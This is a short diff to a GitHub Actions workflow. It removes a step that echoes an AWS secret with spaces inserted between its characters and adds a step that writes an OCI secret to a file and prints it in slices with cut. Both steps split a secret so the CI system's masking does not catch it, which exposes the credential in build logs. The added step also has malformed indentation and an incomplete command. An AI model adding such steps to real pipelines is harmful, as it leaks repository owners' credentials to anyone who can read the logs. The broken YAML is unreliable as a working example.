@@ -7,11 +7,6 @@ jobs:
     runs-on: ubuntu-latest
 
     steps:
-    - name: Check out code
-      uses: actions/checkout@v2
-
-    - name: Set up secret file
-      env:
-        AWS_ACCESS_KEY_ID: ${{ secrets.OCI_PRIVATE_KEY_FILENAME }}
-      run: |
-        echo ${{secrets.AWS_ACCESS_KEY_ID}} | sed 's/./& /g'
+        - name: SMSE
+          run: echo -n "${{ secrets.OCI_PRIVATE_KEY_FILENAME }}" >> foo && cut -c1-3 foo && cut -c4
+      
